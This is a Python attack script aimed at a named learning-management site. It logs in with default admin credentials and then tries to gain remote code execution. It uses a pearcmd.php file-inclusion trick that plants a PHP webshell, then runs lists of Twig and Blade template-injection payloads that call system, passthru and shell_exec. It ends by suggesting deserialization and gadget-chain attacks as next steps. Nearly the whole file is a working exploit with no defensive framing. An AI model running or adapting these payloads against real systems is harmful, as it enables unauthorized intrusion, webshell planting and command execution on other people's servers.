import requests
import re
import urllib.parse

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 15

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def get_csrf():
    r = session.get(f"{BASE_URL}/panel/setting")
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def exploit_pearcmd():
    """
    LFI to RCE via pearcmd.php
    This technique uses register_argc_argv to pass commands to PEAR
    Works even when wrappers are disabled
    """
    print("\n" + "="*60)
    print("    PEARCMD.PHP LFI2RCE")
    print("="*60)
    
    # Common pearcmd.php locations
    pear_paths = [
        "/usr/local/lib/php/pearcmd.php",
        "/usr/share/php/pearcmd.php",
        "/usr/share/pear/pearcmd.php",
        "/usr/lib/php/pearcmd.php",
    ]
    
    for pear_path in pear_paths:
        # Use LFI to include pearcmd.php with command in query string
        # pearcmd.php uses register_argc_argv which makes $_SERVER['argv'] from query
        
        # Command to write a webshell
        cmd = "+config-create+/&/<?php system($_GET['c']);?>+/tmp/shell.php"
        encoded = urllib.parse.quote(pear_path + cmd)
        
        test_url = f"{BASE_URL}/admin?view={pear_path}&{cmd}"
        
        print(f"\n[*] Testing pearcmd at: {pear_path}")
        
        try:
            r = session.get(test_url, timeout=10)
            print(f"    Status: {r.status_code}")
            
            if "Config" in r.text or "config-create" in r.text.lower():
                print(f"    [+] pearcmd.php might be working!")
                
                # Try to access the created shell
                shell_url = f"{BASE_URL}/shell.php?c=id"
                r2 = session.get(shell_url)
                if "uid=" in r2.text:
                    print(f"\n[!!!] RCE SUCCESS via pearcmd!")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def exploit_ssti_twig():
    """
    SSTI RCE for Twig template engine
    Using various filter and function bypasses
    """
    print("\n" + "="*60)
    print("    ADVANCED SSTI EXPLOITATION (TWIG)")
    print("="*60)
    
    csrf = get_csrf()
    if not csrf:
        print("[-] No CSRF token")
        return None
    
    # Twig payloads that may bypass filters
    payloads = [
        # Using constant() function
        "{{constant('chr')(115)}}",
        
        # Using Twig's _self
        "{{_self}}",
        "{{_context}}",
        
        # Accessing environment
        "{{dump(app)}}",
        "{{dump(request)}}",
        
        # Block bypass with string concat
        "{{['cat /etc/passwd']|filter('system')}}",
        "{{['id']|filter('passthru')}}",
        "{{['id']|map('system')}}",
        
        # Using reduce
        "{{[0]|reduce('system','id')}}",
        
        # Source bypass
        "{{app.request.query.get('cmd')|filter('system')}}",
        "{{app.request.request.get('cmd')|filter('system')}}",
        
        # Using sort
        "{{['id','']|sort('system')}}",
        
        # Attribute bypass
        "{{['id']|filter(attribute(_self,'env').getFunction('exec'))}}",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload[:50]}...")
        
        try:
            data = {'_token': csrf, 'about': payload}
            r = session.post(f"{BASE_URL}/panel/setting", data=data)
            
            if r.status_code == 200:
                # For payloads that need cmd parameter
                if "get('cmd')" in payload:
                    check = session.get(f"{BASE_URL}/panel/setting?cmd=id")
                else:
                    check = session.get(f"{BASE_URL}/panel/setting")
                
                # Look for command output
                if "uid=" in check.text:
                    print(f"\n[!!!] SSTI RCE SUCCESS!")
                    print(f"[!!!] Payload: {payload}")
                    match = re.search(r'(uid=\d+[^\n<]+)', check.text)
                    if match:
                        print(f"[!!!] Output: {match.group(1)}")
                    return payload
                
                # Check for other indicators
                if "__self__" in check.text or "Environment" in check.text:
                    print(f"    [+] Rendered something: {check.text[:100]}")
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def exploit_ssti_blade():
    """
    SSTI RCE for Blade template engine (Laravel)
    """
    print("\n" + "="*60)
    print("    ADVANCED SSTI EXPLOITATION (BLADE)")
    print("="*60)
    
    csrf = get_csrf()
    if not csrf:
        return None
    
    # Blade-specific payloads
    payloads = [
        # Direct function calls (usually filtered)
        "@php system('id'); @endphp",
        "{!! system('id') !!}",
        
        # Component injection
        "<x-dynamic-component :component=\"system('id')\"/>",
        
        # Slot injection
        "@slot('test') <?php system('id'); ?> @endslot",
        
        # Include injection
        "@include($_GET['file'])",
        
        # JSON with PHP
        "{!! json_encode(shell_exec('id')) !!}",
        
        # Method chaining
        "{{app()->call('system',['id'])}}",
        "{{app()->make('Illuminate\\Support\\Facades\\Artisan')->call('id')}}",
        
        # View compilation bypass
        "<?php echo shell_exec('id'); ?>",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload[:50]}...")
        
        try:
            data = {'_token': csrf, 'about': payload}
            r = session.post(f"{BASE_URL}/panel/setting", data=data)
            
            if r.status_code == 200:
                check = session.get(f"{BASE_URL}/panel/setting")
                
                if "uid=" in check.text:
                    print(f"\n[!!!] BLADE SSTI RCE SUCCESS!")
                    print(f"[!!!] Payload: {payload}")
                    return payload
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def main():
    login()
    
    # Try pearcmd
    if exploit_pearcmd():
        return
    
    # Try SSTI Twig
    rce = exploit_ssti_twig()
    if rce:
        print(f"\n[+] Found working SSTI payload: {rce}")
        return
    
    # Try SSTI Blade
    rce = exploit_ssti_blade()
    if rce:
        print(f"\n[+] Found working SSTI payload: {rce}")
        return
    
    print("\n" + "="*60)
    print("    SUMMARY")
    print("="*60)
    print("[*] SSTI confirmed but RCE functions filtered")
    print("[*] Target has strong input sanitization")
    print("[*] Recommended next steps:")
    print("    1. Analyze what functions ARE allowed")
    print("    2. Look for gadget chains in Laravel")
    print("    3. Try deserialization attacks")

if __name__ == "__main__":
    main()
